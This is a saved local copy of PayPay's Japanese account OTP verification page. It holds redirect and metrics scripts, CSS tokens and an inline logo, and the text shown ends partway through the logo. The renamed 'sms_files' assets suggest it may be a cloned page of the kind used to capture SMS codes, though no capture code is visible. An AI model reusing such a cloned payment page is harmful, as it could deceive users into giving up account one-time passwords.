<!DOCTYPE html>
<!-- saved from url=(0040)https://www.paypay.ne.jp/app/account/otp -->
<html lang="ja"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,height=device-height,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover"><meta name="robots" content="noindex"><link rel="icon" href="https://www.paypay.ne.jp/cdn/apps/prod/web/4-10-0/favicon.ico"><title>PayPay</title><script>(function () {
        try {
          var regexp = /MSIE\s+(\d+)\.\d+/ig;
          var m = regexp.exec(navigator.userAgent);
          if(m) {
            var major = parseInt(m[1], 10);
            if (major && major < 10) {
              window.location.href =
                'https://static.paypay.ne.jp/pages/browser-upgrade/index-ie9.html';
              return
            } else if (major >= 10) {
              window.location.href =
                'https://static.paypay.ne.jp/pages/browser-upgrade/index.html';
              return
            }
          }
            var isIE11 = /MSIE 11|Trident\/7\.0/.test(navigator.userAgent);
            if(isIE11){
              window.location.href =
                'https://static.paypay.ne.jp/pages/browser-upgrade/index.html';
            }
        } catch (e) {
          console.log(e)
        }
      })()</script><script>(function () {
        var apiPath10s = '/api/v1/custom-metrics/appLoadTimeout10S'
        var hasLoaded = false

        function appMountHandler() {
          hasLoaded = true
          window.removeEventListener('app-mount', appMountHandler)
        }

        window.addEventListener('app-mount', appMountHandler, true)
        setTimeout(function () {
          if (!hasLoaded) {
            try {
              fetch(
                '/portal' + apiPath10s,
                {method: 'get'})
            } catch (e) {
              window.console.log('fetch failed to run')
            }
          }
        }, 10000)
      })()</script><link href="./sms_files/chunk-vendors~253ae210.0fb89b1a.css" rel="preload" as="style"><link href="./sms_files/chunk-vendors~fdc6512a.61c8e8bc.css" rel="preload" as="style"><link href="./sms_files/main~5a11b65b.305b4c7b.css" rel="preload" as="style"><link href="./sms_files/main~6a2c624d.fcb27ef1.css" rel="preload" as="style"><link href="./sms_files/main~748942c6.dc692474.css" rel="preload" as="style"><link href="./sms_files/npm.element-ui~793f9119.6d7c9c7e.css" rel="preload" as="style"><link href="./sms_files/npm.element-ui~793f9119.6d7c9c7e.css" rel="stylesheet"><link href="./sms_files/chunk-vendors~253ae210.0fb89b1a.css" rel="stylesheet"><link href="./sms_files/chunk-vendors~fdc6512a.61c8e8bc.css" rel="stylesheet"><link href="./sms_files/main~748942c6.dc692474.css" rel="stylesheet"><link href="./sms_files/main~5a11b65b.305b4c7b.css" rel="stylesheet"><link href="./sms_files/main~6a2c624d.fcb27ef1.css" rel="stylesheet"><style type="text/css">:root {
  --size-touchArea: 44px;
  --size-icon-large: 28px;
  --size-icon-default: 24px;
  --size-icon-small: 20px;
  --size-border-default: 1px;
  --shadow-down-high: 0px 8px 20px 0px rgba(0,0,0,0.3);
  --shadow-down-middle: 0px 6px 15px 0px rgba(0,0,0,0.15);
  --shadow-down-low: 0px 2px 6px 0px rgba(0,0,0,0.08);
  --shadow-up-high: 0px -8px 20px 0px rgba(0,0,0,0.3);
  --shadow-up-middle: 0px -6px 15px 0px rgba(0,0,0,0.15);
  --shadow-up-low: 0px -2px 6px 0px rgba(0,0,0,0.08);
  --ratio-image-landscape: 50%; /* 1:2 */
  --ratio-banner-landscape: 50%; /* 1:2 */
  --ratio-banner-rectangle: 62%; /* 1:1.6 */
  --ratio-banner-square: 100%; /* 1:1 */
  --radius-circle: 50%; /* It's a web only technique to create a circle */
  --radius-halfSheet: 20px;
  --radius-button: 8px;
  --radius-card: 8px;
  --gradient-kyc: linear-gradient(270deg, rgb(69, 226, 255) 0%, rgb(0, 185, 245) 100%);
  --gradient-paypaySky: linear-gradient(90deg, rgb(87, 164, 255) 0%, rgb(0, 185, 245) 100%);
  --gradient-paypayHome: linear-gradient(180deg, rgb(255, 148, 108) 0%, rgb(255, 59, 98) 100%);
  --font-family-default: 'Graphik', 'Hiragino Sans', 'Hiragino Kaku Gothic ProN', 'Noto Sans', 'Noto Sans CJK JP', 'Noto Sans JP', 'Meiryo', sans-serif; /* The value is designed for web's font fallback. Not for native. We should redesign it if App team needs it */
  --font-weight-bold-android: 700; /* The value is designed for android web. Not for native android. We should redesign it if App team needs it */
  --font-weight-bold-ios: 600; /* The value is designed for ios web. Not for native ios. We should redesign it if App team needs it */
  --font-weight-default: 300;
  --font-size-20: 20;
  --font-size-18: 18;
  --font-size-16: 16;
  --font-size-14: 14;
  --font-size-12: 12;
  --font-size-11: 11; /* the small size of the font. This should not be used in Web */
  --font-size-10: 10; /* the small size of the font. This should not be used in Web */
  --font-lineHeight-default: 1.5;
  --color-background-overlay: rgba(0, 0, 0, 0.6);
  --color-border-image: rgba(0, 0, 0, 0.05);
  --color-text-attention: #f88600;
  --color-global-peach-4: #ffe5f3;
  --color-global-peach-3: #ffb4dd;
  --color-global-peach-2: #ff4cad;
  --color-global-peach-1: #f23099;
  --color-global-grape-4: #f7e5ff;
  --color-global-grape-3: #d9b0ec;
  --color-global-grape-2: #9047b2;
  --color-global-grape-1: #7921a3;
  --color-global-berry-4: #ddeafe;
  --color-global-berry-3: #bbcff2;
  --color-global-berry-2: #2455aa;
  --color-global-berry-1: #002970;
  --color-global-cornFlower-4: #e5f1ff;
  --color-global-cornFlower-3: #badaff;
  --color-global-cornFlower-2: #4da0ff;
  --color-global-cornFlower-1: #3895ff;
  --color-global-soda-4: #e5f8ff;
  --color-global-soda-3: #baeeff;
  --color-global-soda-2: #33cdff;
  --color-global-soda-1: #00b8f5;
  --color-global-mint-4: #dff7f7;
  --color-global-mint-3: #8ae7e7;
  --color-global-mint-2: #41d9d9;
  --color-global-mint-1: #00c2c2;
  --color-global-basil-4: #dff7ed;
  --color-global-basil-3: #a1e5c8;
  --color-global-basil-2: #52cc97;
  --color-global-basil-1: #20bf7a;
  --color-global-lime-4: #e5f7df;
  --color-global-lime-3: #bcf1a9;
  --color-global-lime-2: #79d957;
  --color-global-lime-1: #56d32a;
  --color-global-mango-4: #fff7e5;
  --color-global-mango-3: #ffba8b;
  --color-global-mango-2: #ffc733;
  --color-global-mango-1: #ffb900;
  --color-global-orange-4: #fff0e5;
  --color-global-orange-3: #ffba8b;
  --color-global-orange-2: #ff954c;
  --color-global-orange-1: #fc6600;
  --color-global-cherry-4: #ffe5e5;
  --color-global-cherry-3: #ffb2b2;
  --color-global-cherry-2: #fd5c5c;
  --color-global-cherry-1: #fa1919;
  --color-global-paypayRed: #ff0033;
  --color-global-charcoal-8: #ffffff;
  --color-global-charcoal-7: #f7f7f7;
  --color-global-charcoal-6: #eeeeee;
  --color-global-charcoal-5: #dddddd;
  --color-global-charcoal-4: #bababa;
  --color-global-charcoal-3: #909090;
  --color-global-charcoal-2: #606060;
  --color-global-charcoal-1: #242323;
  --color-icon-inactive: var(--color-global-charcoal-3);
  --color-icon-default: var(--color-global-charcoal-2);
  --color-icon-white: var(--color-global-charcoal-8);
  --color-icon-secondary: var(--color-global-cornFlower-1);
  --color-icon-cornFlower: var(--color-global-cornFlower-1);
  --color-icon-main: var(--color-global-berry-1);
  --color-icon-berry: var(--color-global-berry-1);
  --color-background-secondary: var(--color-global-charcoal-7);
  --color-background-main: var(--color-global-charcoal-8);
  --color-border-divider: var(--color-global-charcoal-7);
  --color-border-white: var(--color-global-charcoal-8);
  --color-border-default: var(--color-global-charcoal-5);
  --color-border-frame: var(--color-global-charcoal-5);
  --color-border-darker: var(--color-global-charcoal-4);
  --color-border-charcoal: var(--color-global-charcoal-4);
  --color-border-button: var(--color-global-cornFlower-1);
  --color-status-disabled: var(--color-global-charcoal-4);
  --color-status-attention: var(--color-global-mango-1);
  --color-status-failed: var(--color-global-charcoal-3);
  --color-status-success: var(--color-global-basil-1);
  --color-status-error: var(--color-global-cherry-1);
  --color-text-accent: var(--color-global-berry-1);
  --color-text-success: var(--color-global-basil-1);
  --color-text-link: var(--color-global-cornFlower-1);
  --color-text-error: var(--color-global-cherry-1);
  --color-text-white: var(--color-global-charcoal-8);
  --color-text-disabled: var(--color-global-charcoal-4);
  --color-text-empty: var(--color-global-charcoal-4);
  --color-text-subtext: var(--color-global-charcoal-3);
  --color-text-secondary: var(--color-global-charcoal-2);
  --color-text-primary: var(--color-global-charcoal-1);
  --color-global-white: var(--color-global-charcoal-8); /* the alias of charcoal 08 */
  --color-global-black: var(--color-global-charcoal-1); /* the alias of charcoal 01 */
}

/**
 Temparary tokens, They should be merged to design system
*/

:root {
  --HalfSheetHeader-border-color: #eee;
  --HalfSheet-footer-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
}
</style><link href="https://www.google-analytics.com/" rel="preconnect"><script async="" src="./sms_files/analytics.js.ダウンロード" charset="utf-8"></script><link rel="stylesheet" type="text/css" href="./sms_files/account-page~f71cff67.96e81cc5.css"><link rel="stylesheet" type="text/css" href="./sms_files/account-page-otp~f71cff67.0e3876a7.css"></script><script src="./sms_files/js" async=""></script></head><body class="outside-native"><div id="app"><div class="container"><section data-v-c5ef4130="" class="account-root-page"><section data-v-f601f2c2="" data-v-c5ef4130="" class="top-header account-header"><header data-v-f601f2c2="" class="header-signin"><img data-v-f601f2c2="" src="data:image/png;base64,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